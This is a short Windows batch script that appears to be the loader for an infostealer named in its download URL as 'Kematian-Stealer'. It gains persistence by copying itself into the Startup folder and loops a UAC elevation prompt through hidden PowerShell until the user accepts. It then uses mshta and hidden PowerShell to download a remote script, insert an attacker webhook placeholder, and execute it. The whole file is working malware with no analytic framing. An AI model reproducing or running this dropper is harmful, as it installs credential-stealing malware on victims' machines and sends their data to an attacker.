@echo off
cd /d "%~dp0"
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex",0))